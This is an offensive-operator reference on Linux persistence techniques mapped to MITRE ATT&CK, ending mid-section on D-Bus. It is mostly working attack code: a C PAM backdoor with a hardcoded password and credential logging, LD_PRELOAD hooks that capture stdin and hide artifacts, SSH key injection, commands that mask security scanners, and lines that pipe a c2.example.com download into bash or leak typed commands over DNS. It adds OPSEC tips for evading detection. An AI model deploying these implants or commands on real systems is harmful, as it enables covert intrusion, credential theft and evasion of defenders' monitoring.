# Linux Persistence Mechanisms

> **MITRE ATT&CK Mapping**: T1053.003 (Cron), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification), T1547.006 (Kernel Modules and Extensions), T1574.006 (Dynamic Linker Hijacking), T1556.003 (Pluggable Authentication Modules), T1547.013 (XDG Autostart Entries), T1546.017 (Udev Rules)
> **Tactic**: Persistence (TA0003)
> **Platforms**: Linux
> **Required Permissions**: Varies -- User-level for cron/shell/XDG/SSH; Root for systemd system-level, PAM, LD_PRELOAD global, kernel modules, udev, eBPF
> **OPSEC Risk**: Medium to Critical (depending on mechanism; kernel-level persistence carries highest detection risk from EDR/integrity monitoring)

---

## Strategic Overview

Linux persistence is the art of ensuring continued access to a compromised system across reboots, user logouts, and service restarts. Unlike Windows, Linux offers an extraordinarily diverse set of persistence vectors due to its modular architecture, open configuration files, and the transparency of its init system. A skilled operator must understand not only how to plant persistence mechanisms, but which mechanism is appropriate for a given environment, privilege level, and detection posture. The choice between a simple cron job and an eBPF-pinned rootkit should be driven by the operational context: dwell time requirements, target monitoring capabilities, and the acceptable risk of discovery.

Modern Linux environments have shifted heavily toward systemd-based init systems, containerized workloads, and cloud-native deployments. This means persistence strategies must account for ephemeral infrastructure (where traditional disk-based persistence may be wiped on redeployment), immutable root filesystems (as in CoreOS, Flatcar, or Bottlerocket), and sophisticated EDR solutions that monitor file integrity, process creation, and kernel-level activity. The 2025 threat landscape has seen a marked increase in eBPF-based persistence (exemplified by the LinkPro and Caracal rootkits), PAM backdoors like the "Plague" implant, and creative abuse of systemd generators and drop-in directories.

Effective persistence planning requires layering multiple mechanisms at different privilege levels and detection surfaces. A robust persistence strategy might combine a user-level shell configuration modification (low privilege, low detection risk) with a system-level systemd timer (moderate risk) and a kernel-level eBPF program (high stealth but requiring root). This defense-in-depth approach to persistence ensures that the loss of one mechanism does not result in total loss of access.

---

## Technical Deep-Dive

### 1. Cron Jobs (T1053.003)

Cron is the classic Linux scheduling daemon. Persistence via cron is well-understood by defenders but remains effective due to the sheer number of legitimate cron jobs on most systems.

#### User Crontab

```bash
# List current user crontab
crontab -l

# Edit current user crontab (adds persistence)
crontab -e
# Add line:
* * * * * /tmp/.hidden/beacon.sh

# Inject without interactive editor
(crontab -l 2>/dev/null; echo "*/5 * * * * /var/tmp/.update.sh") | crontab -

# Add with @reboot directive (runs on system boot)
(crontab -l 2>/dev/null; echo "@reboot /tmp/.cache/updater.sh") | crontab -

# Persist as another user (requires root)
crontab -u www-data -e
(crontab -u www-data -l 2>/dev/null; echo "*/10 * * * * /var/www/.maintenance.sh") | crontab -u www-data -
```

#### System-Level Cron Directories

```bash
# /etc/cron.d/ - drop-in directory for system cron jobs
cat > /etc/cron.d/system-update << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/lib/.libsystem.so.2
EOF
chmod 644 /etc/cron.d/system-update

# /etc/cron.daily/ - runs once daily (via anacron)
cat > /etc/cron.daily/apt-update-check << 'EOF'
#!/bin/bash
/opt/.cache/.updater &
EOF
chmod 755 /etc/cron.daily/apt-update-check

# /etc/cron.hourly/, /etc/cron.weekly/, /etc/cron.monthly/ follow same pattern
```

#### Anacron

Anacron handles jobs that should have run while the system was off. It is ideal for persistence on laptops or intermittently powered systems.

```bash
# /etc/anacrontab format: period delay job-identifier command
cat >> /etc/anacrontab << 'EOF'
1    5    system-health    /usr/local/sbin/.health-check
EOF
```

#### at Jobs

```bash
# One-shot scheduled execution (persists until executed)
echo "/tmp/.beacon.sh" | at now + 1 hour

# Recurring via self-rescheduling
cat > /tmp/.beacon.sh << 'EOF'
#!/bin/bash
curl -s https://c2.example.com/beacon | bash
echo "/tmp/.beacon.sh" | at now + 30 minutes
EOF
chmod +x /tmp/.beacon.sh
```

#### Cron vs. Systemd Timers Comparison

| Feature | Cron | Systemd Timer |
|---|---|---|
| Granularity | 1 minute minimum | Microsecond precision |
| Missed execution handling | Anacron only | `Persistent=true` |
| Logging | Syslog/mail | journald (structured) |
| Dependencies | None | Full systemd dependency graph |
| Resource control | None | Full cgroup integration |
| Detection surface | /var/spool/cron, /etc/cron.* | systemctl list-timers, unit files |

#### OPSEC Notes for Cron
- User crontabs stored in `/var/spool/cron/crontabs/` -- monitored by many EDRs
- System crontab changes generate `auditd` events
- Name scripts to blend with existing scheduled maintenance (logrotate, apt-daily, etc.)
- Use full paths to avoid PATH-related failures
- Redirect stderr to `/dev/null` to suppress error logging
- Avoid `* * * * *` (every minute) which generates excessive syslog entries

---

### 2. Systemd Service Abuse (T1543.002)

Systemd is the dominant init system on modern Linux. Its rich feature set provides numerous persistence vectors at both system and user levels.

#### Malicious Service Files

```ini
# /etc/systemd/system/system-health-monitor.service
[Unit]
Description=System Health Monitoring Service
After=network-online.target
Wants=network-online.target
Documentation=man:systemd-health(8)

[Service]
Type=simple
ExecStart=/usr/local/bin/.health-monitor
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
```

```bash
# Deploy and enable
cp health-monitor.service /etc/systemd/system/system-health-monitor.service
systemctl daemon-reload
systemctl enable system-health-monitor.service
systemctl start system-health-monitor.service
```

#### Timer Units (Cron Alternative)

```ini
# /etc/systemd/system/log-rotate-extra.timer
[Unit]
Description=Additional Log Rotation Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=15min
Persistent=true
RandomizedDelaySec=60

[Install]
WantedBy=timers.target
```

```ini
# /etc/systemd/system/log-rotate-extra.service
[Unit]
Description=Additional Log Rotation

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/.log-rotate-extra.sh
```

```bash
systemctl daemon-reload
systemctl enable log-rotate-extra.timer
systemctl start log-rotate-extra.timer
```

#### User-Level vs System-Level Persistence

```bash
# System-level (requires root): /etc/systemd/system/
# User-level (no root required): ~/.config/systemd/user/

mkdir -p ~/.config/systemd/user/

cat > ~/.config/systemd/user/update-notifier.service << 'EOF'
[Unit]
Description=Update Notifier

[Service]
Type=simple
ExecStart=%h/.local/bin/.notifier
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable update-notifier.service
systemctl --user start update-notifier.service

# Enable lingering so user services start at boot (not just at login)
loginctl enable-linger $(whoami)
```

#### Drop-in Directories (Modifying Existing Services)

Drop-in directories allow modifying existing services without replacing the unit file. This is stealthier because the main service file remains unchanged and file integrity checks on the original pass.

```bash
# Override an existing service without replacing the unit file
mkdir -p /etc/systemd/system/sshd.service.d/

cat > /etc/systemd/system/sshd.service.d/override.conf << 'EOF'
[Service]
ExecStartPost=/usr/local/bin/.ssh-post-hook
EOF

systemctl daemon-reload
systemctl restart sshd
```

#### Masking Legitimate Services

```bash
# Mask a security service to prevent it from starting
systemctl mask rkhunter.timer
systemctl mask aide-check.timer

# Verify mask (links to /dev/null)
ls -la /etc/systemd/system/rkhunter.timer
```

#### Systemd Generator Abuse

Generators are small executables placed in `/usr/lib/systemd/system-generators/` or `/etc/systemd/system-generators/` that run early in the boot process and can dynamically create unit files.

```bash
cat > /etc/systemd/system-generators/system-setup-gen << 'GENEOF'
#!/bin/bash
# Generator runs at boot and creates a transient unit
mkdir -p "$1"
cat > "$1/system-setup-early.service" << 'EOF'
[Unit]
Description=Early System Setup
DefaultDependencies=no
Before=basic.target

[Service]
Type=oneshot
ExecStart=/usr/lib/.early-setup
RemainAfterExit=yes
EOF
ln -sf "$1/system-setup-early.service" "$1/basic.target.wants/system-setup-early.service"
GENEOF
chmod 755 /etc/systemd/system-generators/system-setup-gen
```

#### WantedBy Targets Reference

| Target | When It Runs | Use Case |
|---|---|---|
| `multi-user.target` | Non-graphical multi-user boot | Servers, most common |
| `graphical.target` | Graphical desktop boot | Desktop systems |
| `network-online.target` | After network is fully up | Network-dependent payloads |
| `timers.target` | Timer activation | For .timer units |
| `default.target` | User session (user services) | User-level persistence |

---

### 3. Shell Configuration Modification (T1546.004)

Shell RC files execute on every interactive (and sometimes non-interactive) shell session, providing reliable user-level persistence.

#### Per-User Shell Files

```bash
# .bashrc - executes on every interactive non-login bash shell
echo 'nohup /tmp/.updater >/dev/null 2>&1 &' >> ~/.bashrc

# .bash_profile / .profile - executes on login shells
echo '/usr/local/bin/.session-init &' >> ~/.bash_profile

# .zshrc - ZSH equivalent (increasingly common on modern distros and macOS)
echo 'nohup /opt/.zsh-plugin-update >/dev/null 2>&1 &' >> ~/.zshrc

# .bash_logout - executes on bash logout (exfiltration trigger)
echo 'curl -s https://c2.example.com/logout?h=$(hostname) &' >> ~/.bash_logout
```

#### System-Wide Shell Hooks

```bash
# /etc/profile.d/ - scripts here run for ALL users on login
cat > /etc/profile.d/system-env.sh << 'EOF'
#!/bin/bash
# System environment initialization
if [ -f /usr/lib/.sys-init ]; then
    /usr/lib/.sys-init &
fi
EOF
chmod 644 /etc/profile.d/system-env.sh

# /etc/bash.bashrc - system-wide bashrc (Debian/Ubuntu)
# /etc/bashrc - system-wide bashrc (RHEL/CentOS)
echo 'test -x /usr/lib/.sys-helper && /usr/lib/.sys-helper &' >> /etc/bash.bashrc
```

#### PROMPT_COMMAND Abuse

`PROMPT_COMMAND` is a bash variable whose contents are executed as a regular command just before bash displays each primary prompt. This is extremely powerful for command logging and exfiltration.

```bash
# Inject into .bashrc for keylogging-like behavior
cat >> ~/.bashrc << 'PCEOF'
export PROMPT_COMMAND='history 1 >> /tmp/.cmd_log; ${PROMPT_COMMAND}'
PCEOF

# Stealthy DNS exfiltration of commands
cat >> ~/.bashrc << 'PCEOF'
__log_cmd() {
    local cmd=$(history 1 | sed 's/^[ ]*[0-9]*[ ]*//')
    local encoded=$(echo "$cmd" | base64 | tr '+/' '-_' | head -c 60)
    dig +short "${encoded}.cmd.c2.example.com" > /dev/null 2>&1
}
PROMPT_COMMAND="__log_cmd;${PROMPT_COMMAND}"
PCEOF
```

#### Environment Variable Injection

```bash
# /etc/environment - system-wide environment variables (parsed by PAM)
echo 'LD_PRELOAD=/usr/lib/.libsys.so' >> /etc/environment

# Inject PATH to prioritize trojanized binaries
echo 'PATH=/usr/local/sbin/.override:$PATH' >> /etc/profile.d/path-fix.sh
```

---

### 4. PAM Backdoors (T1556.003)

Pluggable Authentication Modules (PAM) control authentication on Linux. Backdooring PAM provides credential capture and persistent access through authentication bypass.

#### pam_exec.so with Custom Script

```bash
# Create a backdoor script that logs credentials and grants access
cat > /usr/local/sbin/.auth-helper << 'EOF'
#!/bin/bash
# PAM_USER and PAM_TYPE are set by pam_exec
if [ "$PAM_TYPE" = "auth" ]; then
    # Log credentials (password is passed via stdin with expose_authtok)
    read password
    echo "$(date +%s) $PAM_RHOST $PAM_USER:$password" >> /var/log/.auth.log
    chmod 600 /var/log/.auth.log
fi
# Always return success
exit 0
EOF
chmod 755 /usr/local/sbin/.auth-helper

# Inject into PAM sshd configuration (add BEFORE existing auth lines)
sed -i '1a auth optional pam_exec.so expose_authtok quiet /usr/local/sbin/.auth-helper' /etc/pam.d/sshd
```

#### Custom PAM Module Compilation (Backdoor with Hardcoded Password)

```c
/* pam_backdoor.c
   Compile: gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam
   Install: cp pam_backdoor.so /usr/lib/x86_64-linux-gnu/security/ */
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>
#include <syslog.h>

#define BACKDOOR_PASS "s3cur3_b4ckd00r_2025"
#define LOG_FILE "/var/log/.pam_creds.log"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    /* Log credentials for collection */
    if (password && username) {
        FILE *fp = fopen(LOG_FILE, "a");
        if (fp) {
            fprintf(fp, "%s:%s\n", username, password);
            fclose(fp);
        }
    }

    /* Backdoor password bypasses all authentication */
    if (password && strcmp(password, BACKDOOR_PASS) == 0) {
        return PAM_SUCCESS;
    }

    return PAM_IGNORE;  /* Fall through to next module */
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                 int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

```bash
# Compile and install
gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam
cp pam_backdoor.so /usr/lib/x86_64-linux-gnu/security/pam_backdoor.so
# or /usr/lib64/security/ on RHEL-based systems

# Add to PAM stack ("sufficient" bypasses everything else if it succeeds)
sed -i '1a auth sufficient pam_backdoor.so' /etc/pam.d/common-auth
```

#### pam_unix Password Logging via Module Replacement

```bash
# The "Plague" backdoor approach (discovered August 2025 by Nextron Systems):
# Compile a modified pam_unix.so that logs passwords and accepts a hardcoded credential.
# Plague uses evolving obfuscation: XOR to KSA/PRGA to DRBG layers.
# Static credentials and environment tampering maintain stealth.
# Zero AV detections on VirusTotal at time of discovery.

# Module replacement (back up first for recovery)
cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so \
   /usr/lib/x86_64-linux-gnu/security/.pam_unix.so.bak
cp ./pam_unix_modified.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
```

#### PAM Module Stacking Concepts

```
# /etc/pam.d/sshd module stacking example
# Modules are evaluated top-to-bottom
# Control flags: required, requisite, sufficient, optional

auth    sufficient  pam_backdoor.so        # If backdoor pw matches, skip rest
auth    required    pam_unix.so             # Normal password check
auth    required    pam_deny.so             # Deny if nothing matched

# "sufficient": if this module succeeds, no further auth modules are checked
# "optional":   result is ignored unless it is the only module in the stack
# "required":   must pass, but continue checking other modules before returning
# "requisite":  must pass, and return failure immediately if it does not
```

#### /etc/pam.d/ Configuration Files

```bash
# Key PAM configuration files for persistence targets:
# /etc/pam.d/sshd         - SSH login authentication
# /etc/pam.d/login        - Local console login
# /etc/pam.d/sudo         - sudo authentication
# /etc/pam.d/su           - su authentication
# /etc/pam.d/common-auth  - Shared auth config (Debian/Ubuntu)
# /etc/pam.d/system-auth  - Shared auth config (RHEL/CentOS)

# Targeting common-auth or system-auth affects ALL authentication
```

---

### 5. LD_PRELOAD / Dynamic Linker Hijacking (T1574.006)

The dynamic linker loads shared libraries before any others when `LD_PRELOAD` is set or `/etc/ld.so.preload` contains entries, enabling function hooking at the library level.

#### /etc/ld.so.preload (System-Wide, Persistent)

```bash
# Any shared library listed here is loaded into EVERY dynamically linked process
echo "/usr/lib/.libsystem-helper.so" > /etc/ld.so.preload
```

#### LD_PRELOAD Environment Variable

```bash
# Per-session (combine with shell RC persistence for permanence)
export LD_PRELOAD=/tmp/.libhook.so

# Or inject via /etc/environment for all users
echo 'LD_PRELOAD=/usr/lib/.libsystem.so' >> /etc/environment

# Or via shell RC files
echo 'export LD_PRELOAD=/usr/lib/.libcompat.so' >> ~/.bashrc
```

#### Function Hooking Example: Intercepting read() for Credential Capture

```c
/* hook_read.c - Intercept read() to capture data from stdin (fd 0)
   Compile: gcc -shared -fPIC -o hook_read.so hook_read.c -ldl */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

typedef ssize_t (*orig_read_t)(int fd, void *buf, size_t count);

ssize_t read(int fd, void *buf, size_t count) {
    orig_read_t orig_read = (orig_read_t)dlsym(RTLD_NEXT, "read");
    ssize_t result = orig_read(fd, buf, count);

    /* Log data read from stdin (potential password input) */
    if (fd == 0 && result > 0) {
        int logfd = open("/tmp/.input.log", O_WRONLY | O_CREAT | O_APPEND, 0600);
        if (logfd >= 0) {
            write(logfd, buf, result);
            close(logfd);
        }
    }
    return result;
}
```

#### Function Hooking Example: Hiding Output via write() Hook

```c
/* hook_write.c - Filter output to hide specific strings
   Compile: gcc -shared -fPIC -o hook_write.so hook_write.c -ldl */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

typedef ssize_t (*orig_write_t)(int fd, const void *buf, size_t count);

ssize_t write(int fd, const void *buf, size_t count) {
    orig_write_t orig_write = (orig_write_t)dlsym(RTLD_NEXT, "write");

    /* Suppress output containing our artifact names */
    if (fd == 1 || fd == 2) {
        if (memmem(buf, count, ".libsystem-helper", 17) != NULL) {
            return count;  /* Pretend we wrote it, but actually suppress */
        }
    }
    return orig_write(fd, buf, count);
}
```

#### ld.so.conf.d Abuse (Library Search Path Poisoning)

```bash
# Add a directory containing trojanized libraries to the linker search path
echo "/opt/.libs" > /etc/ld.so.conf.d/custom-libs.conf
ldconfig  # Rebuild the cache

# Place a trojanized libcrypt.so.1 in /opt/.libs/ to intercept password operations
# Any program dynamically linking to libcrypt will load the trojan first
```

#### Noteworthy Malware Using LD_PRELOAD
- **Symbiote** (2022-2025): Parasitically infects every running process, hiding network connections and files. FortiGuard Labs detected 3 new samples in 2025.
- **HiddenWasp**: Drops trojan, rootkit, and deployment script using LD_PRELOAD.
- **LinkPro** (2025): Falls back to /etc/ld.so.preload when eBPF is unavailable on the target kernel.
- **Medusa/Azazel**: Open-source LD_PRELOAD rootkits used as references by threat actors.

#### Key Limitation
`LD_PRELOAD` is ignored for SUID binaries as a security measure. This means SUID programs like `sudo`, `passwd`, and `ping` will not load the preloaded library.

---

### 6. SSH Authorized Keys Manipulation

SSH authorized keys provide passwordless authentication and are a reliable persistence mechanism that survives password changes.

#### Basic Authorized Keys Injection

```bash
# Inject attacker's public key
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ... attacker@c2" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Target multiple users (as root)
for user_home in /home/*/; do
    mkdir -p "${user_home}/.ssh"
    echo "ssh-rsa AAAAB3... attacker@c2" >> "${user_home}/.ssh/authorized_keys"
    chown -R $(stat -c '%U' "$user_home") "${user_home}/.ssh"
done

# Root SSH access
echo "ssh-rsa AAAAB3... attacker@c2" >> /root/.ssh/authorized_keys
```

#### command= Restriction (Forced Command Backdoor)

```bash
# Use command= to run a backdoor every time key-based auth occurs
echo 'command="(/tmp/.beacon &); ${SSH_ORIGINAL_COMMAND:-/bin/bash}" ssh-rsa AAAAB3...' \
    >> ~/.ssh/authorized_keys

# SSH_ORIGINAL_COMMAND contains what the user actually requested
# This runs the beacon AND the original command, hiding the backdoor execution
```

#### from= Source Restriction

```bash
# Restrict key usage to specific source IPs (limits exposure if key is discovered)
echo 'from="10.0.0.0/8,192.168.1.0/24" ssh-rsa AAAAB3... attacker@c2' \
    >> ~/.ssh/authorized_keys
```

#### authorized_keys2 (Legacy Fallback)

```bash
# Some older or custom SSHD configs check authorized_keys2
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys2
```

#### SSHD Config Backdoors (Match Blocks)

```bash
# Add a Match block that enables root login from attacker IP only
cat >> /etc/ssh/sshd_config << 'EOF'

# Maintenance access
Match Address 10.10.10.0/24
    PermitRootLogin yes
    PasswordAuthentication yes
    AuthorizedKeysFile /etc/ssh/.maintenance_keys
EOF

# Create the hidden authorized_keys file
echo "ssh-rsa AAAAB3..." > /etc/ssh/.maintenance_keys
chmod 600 /etc/ssh/.maintenance_keys

systemctl restart sshd
```

#### AuthorizedKeysCommand (Dynamic Key Injection)

```bash
# SSHD can call an external command to fetch authorized keys
# Add to /etc/ssh/sshd_config:
#   AuthorizedKeysCommand /usr/local/sbin/fetch-keys %u
#   AuthorizedKeysCommandUser nobody

cat > /usr/local/sbin/fetch-keys << 'EOF'
#!/bin/bash
# Return legitimate keys PLUS attacker key
cat /home/$1/.ssh/authorized_keys 2>/dev/null
echo "ssh-rsa AAAAB3... attacker@c2"
EOF
chmod 755 /usr/local/sbin/fetch-keys
```

---

### 7. Kernel Modules / LKM Persistence (T1547.006)

Loadable Kernel Modules (LKMs) provide the most privileged persistence mechanism, running in ring-0 with full access to the kernel address space.

#### Basic Module Loading Persistence

```bash
# Copy module to kernel module directory
cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/misc/

# Update module dependency database
depmod -a

# Load immediately
insmod /lib/modules/$(uname -r)/kernel/drivers/misc/rootkit.ko
# or use modprobe (resolves dependencies)
modprobe rootkit

# Persist across reboots via modules-load.d
echo "rootkit" > /etc/modules-load.d/rootkit.conf

# Legacy: /etc/modules (Debian-based)
echo "rootkit" >> /etc/modules
```

#### DKMS for Kernel-Update Survivable Persistence

DKMS (Dynamic Kernel Module Support) automatically rebuilds modules when the kernel is updated, ensuring persistence survives kernel upgrades.

```bash
mkdir -p /usr/src/system-helper-1.0/
cat > /usr/src/system-helper-1.0/dkms.conf << 'EOF'
PACKAGE_NAME="system-helper"
PACKAGE_VERSION="1.0"
BUILT_MODULE_NAME[0]="system_helper"
DEST_MODULE_LOCATION[0]="/kernel/drivers/misc/"
AUTOINSTALL="yes"
EOF

# Copy module source code
cp Makefile system_helper.c /usr/src/system-helper-1.0/

# Register and build with DKMS
dkms add -m system-helper -v 1.0
dkms build -m system-helper -v 1.0
dkms install -m system-helper -v 1.0
```

#### Module Signing Bypass

On systems with Secure Boot or `CONFIG_MODULE_SIG_FORCE`, unsigned modules will not load.

```bash
# Check if module signing is enforced
cat /proc/sys/kernel/modules_disabled
cat /proc/config.gz | gunzip | grep MODULE_SIG

# If CONFIG_MODULE_SIG_FORCE is not set, tainted modules can still load
cat /proc/sys/kernel/tainted

# Disable module signature enforcement at boot (if GRUB is accessible)
# Add to GRUB_CMDLINE_LINUX: module.sig_enforce=0

# Sign with the machine's own MOK key if accessible
/usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 \
    /path/to/MOK.priv /path/to/MOK.der rootkit.ko
```

#### /etc/modules-load.d/ Persistence

```bash
# systemd-modules-load.service reads from these directories at boot:
# /etc/modules-load.d/*.conf
# /usr/lib/modules-load.d/*.conf
# /run/modules-load.d/*.conf

echo "system_helper" > /etc/modules-load.d/system-helper.conf
```

#### Notable LKM Rootkits (2024-2025)
- **PUMAKIT**: Uses ftrace to hook 18 syscalls, multi-stage deployment, analyzed by Elastic Security Labs.
- **Singularity**: Targets modern 6.x kernels, hides processes/files/network connections, blocks eBPF monitoring.
- **Parasite**: Module hiding, RCE/reverse shell, persistence.
- **KoviD**: Designated "Red-Team Linux Kernel Rootkit", ftrace-based, bypasses Elastic Security detection.
- **reveng_rtkit**: Hides itself and processes, bypasses rkhunter.

---

### 8. XDG Autostart (T1547.013)

XDG autostart entries execute when a user logs into a graphical desktop environment (GNOME, KDE, XFCE, etc.).

#### User-Level (No Root Required)

```bash
mkdir -p ~/.config/autostart/

cat > ~/.config/autostart/system-updater.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=System Update Notifier
Comment=Checks for system updates
Exec=/home/user/.local/bin/.updater
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
X-GNOME-Autostart-Delay=30
EOF
```

#### System-Level (Root Required)

```bash
cat > /etc/xdg/autostart/system-monitor.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=System Monitor Helper
Comment=Assists with system monitoring
Exec=/usr/local/bin/.sys-monitor
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Terminal=false
EOF
```

Key details:
- If `~/.config/autostart/foo.desktop` and `/etc/xdg/autostart/foo.desktop` both exist, only the user-level file is used (user overrides system).
- `NoDisplay=true` hides the entry from GUI autostart managers.
- `Hidden=true` would disable the entry entirely -- do not confuse these.
- Combine with `Masquerading` by naming the .desktop file after legitimate software.
- Only triggers on graphical login; ineffective on headless servers.

---

### 9. Init Scripts (SysV Init / rc.local)

Legacy init systems are still present on older distributions and some embedded Linux systems. systemd maintains backwards compatibility with these.

#### /etc/rc.local

```bash
# rc.local runs at the end of the boot process
cat > /etc/rc.local << 'EOF'
#!/bin/bash
/usr/local/sbin/.startup-helper &
exit 0
EOF
chmod +x /etc/rc.local

# Ensure rc-local.service is enabled on systemd systems
systemctl enable rc-local.service 2>/dev/null
```

#### SysV Init Scripts

```bash
cat > /etc/init.d/system-helper << 'INITEOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-helper
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Helper Service
# Description:       Provides system health monitoring
### END INIT INFO

case "$1" in
    start)
        /usr/local/sbin/.helper-daemon &
        ;;
    stop)
        pkill -f .helper-daemon
        ;;
    restart)
        $0 stop
        $0 start
        ;;
esac
exit 0
INITEOF
chmod 755 /etc/init.d/system-helper

# Register with init system
update-rc.d system-helper defaults  # Debian/Ubuntu
chkconfig --add system-helper       # RHEL/CentOS
```

---

### 10. eBPF Persistence (2025 Advanced Technique)

Extended Berkeley Packet Filter (eBPF) enables running sandboxed programs in the Linux kernel without changing kernel source or loading kernel modules. In 2025, eBPF emerged as a significant persistence and rootkit vector.

#### BPF Program Pinning for Persistence

eBPF programs normally disappear when the loading process exits. Pinning keeps them alive via the BPF filesystem.

```bash
# Mount BPF filesystem (usually already mounted on modern systems)
mount -t bpf bpf /sys/fs/bpf

# Pin a loaded eBPF program to persist it
# In code: bpf_obj_pin(prog_fd, "/sys/fs/bpf/my_program")

# Verify pinned programs
ls -la /sys/fs/bpf/
bpftool prog list
bpftool map list
```

#### eBPF Rootkit Capabilities (2025 Landscape)

**LinkPro Rootkit** (discovered October 2025 by Synacktiv):
- Initial access via CVE-2024-23897 (Jenkins arbitrary file read) targeting AWS-hosted Kubernetes
- Activated via "magic" TCP SYN packet with window size 54321
- Binary placed at `/usr/lib/.system/.tmp~data.resolveld`
- Systemd unit at `/etc/systemd/system/systemd-resolveld.service` (masquerades as systemd-resolved)
- Uses `tracepoint` and `kretprobe` eBPF programs to hook `getdents` (file hiding) and `sys_bpf` (hides its own BPF programs)
- tc_egress program pinned to `/sys/fs/bpf/fire/tc_egress`
- Falls back to `/etc/ld.so.preload` if `CONFIG_BPF_KPROBE_OVERRIDE` is not available

**Caracal Rootkit** (July 2025):
- Written in Rust for memory safety and reliability
- Hides userland processes and kernel-level BPF programs from monitoring tools
- Designed for red team operations as a post-shell stealth layer
- Resilient to brute-force "unhiding" techniques

**TripleCross** (open-source reference):
- eBPF rootkit with backdoor, C2, library injection, execution hijacking, and persistence
- Hooks syscalls via tracepoints for process and file hiding
- Reverse shell triggered by network magic packets

**BPFDoor / Symbiote** (2025 update):
- FortiGuard Labs detected 151 new BPFDoor samples in 2025
- Uses BPF socket filters for stealth network communication
- Passive implant waiting for magic packet activation

#### eBPF Loader Persistence Pattern

```bash
# The eBPF programs themselves live in kernel memory, but a loader must
# persist on disk to reload them after reboot

# Method: systemd service as loader
cat > /etc/systemd/system/bpf-filter-loader.service << 'EOF'
[Unit]
Description=BPF Network Filter Loader
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/.bpf-loader
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable bpf-filter-loader.service
```

#### eBPF Requirements and Limitations
- Requires `CAP_BPF` or `CAP_SYS_ADMIN` (typically root)
- eBPF verifier enforces safety constraints -- programs must terminate and cannot access arbitrary kernel memory
- Kernel version >= 4.x required, newer features need 5.x+
- `kernel.unprivileged_bpf_disabled=1` blocks non-root eBPF usage
- Traditional antivirus and file-based EDR are blind to in-kernel eBPF programs

---

### 11. udev Rules (T1546.017)

udev manages device events and can execute commands when devices are added, removed, or changed. Added to the MITRE ATT&CK matrix in v16.1 (October 2024).

#### Basic udev Persistence

```bash
cat > /etc/udev/rules.d/99-persistence.rules << 'EOF'
# Trigger on any block device change (fires frequently)
ACTION=="add", SUBSYSTEM=="block", RUN+="/usr/local/sbin/.device-handler"

# Trigger on network interface up
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/local/sbin/.net-handler"

# Trigger on USB device insertion
ACTION=="add", SUBSYSTEM=="usb", ATTR{idVendor}=="*", RUN+="/usr/local/sbin/.usb-handler"
EOF

udevadm control --reload-rules
udevadm trigger
```

#### Bypassing the udev Sandbox

udev rules run within the systemd-udevd sandbox, which blocks network and filesystem access. Bypass strategies:

```bash
# Method 1: Spawn a detached process via at
cat > /usr/local/sbin/.device-handler << 'EOF'
#!/bin/bash
echo "/usr/local/sbin/.implant" | at now
EOF

# Method 2: Use systemd-run to escape the sandbox
cat > /usr/local/sbin/.device-handler << 'EOF'
#!/bin/bash
systemd-run --no-block /usr/local/sbin/.implant
EOF

# Method 3: Write a trigger file for a cron job to pick up
cat > /usr/local/sbin/.device-handler << 'EOF'
#!/bin/bash
touch /tmp/.trigger
EOF
# Corresponding cron:
# * * * * * [ -f /tmp/.trigger ] && /usr/local/sbin/.implant && rm /tmp/.trigger
```

#### udev Rule Directories (Priority Order)

| Directory | Priority | Notes |
|---|---|---|
| `/etc/udev/rules.d/` | Highest | Admin overrides |
| `/run/udev/rules.d/` | Medium | Runtime rules |
| `/usr/lib/udev/rules.d/` | Lowest | Vendor/distro defaults |
| `/usr/local/lib/udev/rules.d/` | Low | Local additions |
| `/lib/udev/rules.d/` | Low | Legacy location |

#### Real-World: sedexp Malware
Used udev rules for persistence while modifying memory to filter its own artifacts from `ls` and `find` output, concealing webshells and modified Apache configuration files.

---

### 12. D-Bus Service Hijacking

D-Bus is the inter-process communication (IPC) system used by Linux desktop environments and many system services.

#### Registering a Malicious System D-Bus Service

```bash
# System-wide D-Bus services
cat > /usr/share/dbus-1/system-services/org.freedesktop.SystemHelper.service << 'EOF'
[D-BUS Service]
Name=org.freedesktop.SystemHelper
Exec=/usr/local/sbin/.system-helper-dbus
User=root
